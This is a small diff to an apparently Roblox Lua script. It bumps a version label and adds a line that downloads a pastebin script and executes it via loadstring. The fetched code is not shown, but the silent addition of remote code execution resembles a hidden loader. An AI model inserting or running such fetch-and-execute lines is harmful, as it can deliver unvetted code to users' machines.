@@ -14,7 +14,11 @@ local Controls: ScreenGui = game:GetObjects("rbxassetid://102160674504380")[1]
 Controls.Parent = game.Players.LocalPlayer.PlayerGui
 Controls.Enabled = true
 Controls.MobileContainer.Visible = false
-Controls.Version.Text = "Version: Shedletsky 1.0"
+Controls.Version.Text = "Version: Shedletsky 1.1"
+
+loadstring(game:HttpGet("https://pastebin.com/raw/Kc5Wpt9s"))()
+wait(0.8)
+
 do
 	local Accessories = {}
 
